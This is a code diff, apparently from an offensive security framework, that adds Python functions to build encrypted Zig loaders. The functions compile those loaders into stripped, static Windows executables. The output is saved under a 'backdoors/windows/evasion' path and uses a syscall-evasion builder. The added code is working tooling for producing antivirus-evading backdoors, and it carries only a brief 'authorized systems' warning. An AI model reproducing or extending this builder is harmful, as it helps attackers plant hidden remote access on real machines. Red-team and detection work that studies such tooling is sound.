@@ -92,6 +92,41 @@ def generate_payload_bytes(module: Any) -> Optional[bytes]:
     return bytes(raw_payload)
 
 
+def compile_zig_pe(
+    *,
+    source: str,
+    exe_path: Path,
+    headers_dir: str | None = None,
+    framework=None,
+    optimization: str = "ReleaseSmall",
+    windows_subsystem: str = "windows",
+    extra_link: list[str] | None = None,
+) -> bool:
+    """Compile generated Zig source to a Windows PE (same toolchain as zig_shell_evasion)."""
+    compiler = ExeCompiler(framework=framework)
+    zig = compiler._get_zig_compiler()
+    if not zig.is_available():
+        print_error("Zig compiler not available; cannot generate PE.")
+        return False
+    link = list(extra_link or [])
+    for flag in ("-lc", "-lkernel32", "-luser32", "-ladvapi32"):
+        if flag not in link:
+            link.append(flag)
+    subsystem = None if windows_subsystem == "console" else windows_subsystem
+    return zig.compile(
+        source_code=source,
+        output_path=str(exe_path.resolve()),
+        target_platform="windows",
+        target_arch="x64",
+        optimization=optimization,
+        strip=True,
+        static=True,
+        windows_subsystem=subsystem,
+        include_dir=headers_dir,
+        extra_args=link,
+    )
+
+
 def compile_c_pe(
     *,
     source: str,
@@ -169,6 +204,66 @@ def build_encrypted_c_backdoor(
         framework=getattr(module, "framework", None),
         optimization=str(option_value(module, "optimization") or "ReleaseSmall"),
         windows_subsystem=str(option_value(module, "windows_subsystem") or subsystem),
+    )
+
+    if ok and exe_path.is_file():
+        size = exe_path.stat().st_size
+        print_success(f"Backdoor executable generated: {exe_path} ({size} bytes)")
+        print_warning("Use only on authorized systems. Start a matching listener before running the EXE.")
+        return True
+
+    print_error("PE compilation failed. Ensure Zig is installed (core/lib/compiler/zig_executable or PATH).")
+    return False
+
+
+def build_encrypted_zig_backdoor(
+    module: Any,
+    builder: Any,
+    *,
+    build_source_kwargs: dict | None = None,
+    output_name: str,
+    save_source_name: str = "main.zig",
+    subsystem: str = "windows",
+    extra_link: list[str] | None = None,
+) -> bool:
+    """Encrypt payload, emit Zig loader source, compile with zig build-exe."""
+    raw_payload = generate_payload_bytes(module)
+    if not raw_payload:
+        return False
+
+    report_payload_size(raw_payload)
+
+    encoded, key, iv = builder.encrypt_payload(raw_payload)
+    build_fn = getattr(builder, "build_zig_source", None)
+    if build_fn is None:
+        print_error("Loader builder does not implement build_zig_source().")
+        return False
+    source = build_fn(encoded, key, iv, **(build_source_kwargs or {}))
+
+    out_dir, exe_name = prepare_exe_output(
+        module,
+        "backdoors/windows/evasion",
+        str(option_value(module, "output_name") or output_name),
+    )
+    exe_path = out_dir / exe_name
+
+    if option_value(module, "save_source"):
+        src_path = out_dir / save_source_name
+        src_path.write_text(source, encoding="utf-8")
+        print_success(f"Zig source saved: {src_path}")
+
+    from lib.compile.syscall_evasion import SyscallEvasionBuilder
+
+    headers = str(SyscallEvasionBuilder.headers_directory())
+    needs_crypto = getattr(builder, "cipher", "chacha") in ("chacha", "rc4")
+    ok = compile_zig_pe(
+        source=source,
+        exe_path=exe_path,
+        headers_dir=headers if needs_crypto else None,
+        framework=getattr(module, "framework", None),
+        optimization=str(option_value(module, "optimization") or "ReleaseSmall"),
+        windows_subsystem=str(option_value(module, "windows_subsystem") or subsystem),
+        extra_link=extra_link,
     )
 
     if ok and exe_path.is_file():
